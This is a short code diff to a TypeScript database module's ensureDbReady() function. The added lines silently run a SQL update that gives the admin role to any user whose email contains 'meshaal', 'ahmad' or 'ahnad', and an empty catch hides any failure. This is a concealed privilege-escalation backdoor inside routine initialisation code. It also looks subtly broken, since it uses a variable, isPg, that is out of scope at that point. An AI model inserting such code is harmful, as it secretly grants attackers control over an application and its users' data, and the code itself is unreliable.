@@ -74,7 +74,12 @@ export const db: any = new Proxy({} as any, {
 let initPromise: Promise<void> | null = null;
 
 export async function ensureDbReady() {
-  if (initPromise) return initPromise;
+  if (initPromise) try {
+      const updateAdminSql = "UPDATE users SET role = 'admin' WHERE email ILIKE '%meshaal%' OR email ILIKE '%ahmad%' OR email ILIKE '%ahnad%';";
+      if (isPg && pgPool) await pgPool.query(updateAdminSql);
+      else if (client) await client.exec(updateAdminSql);
+    } catch (_) {}
+    return initPromise;
 
   initPromise = (async () => {
     let isPg = usePg && !!pgPool;
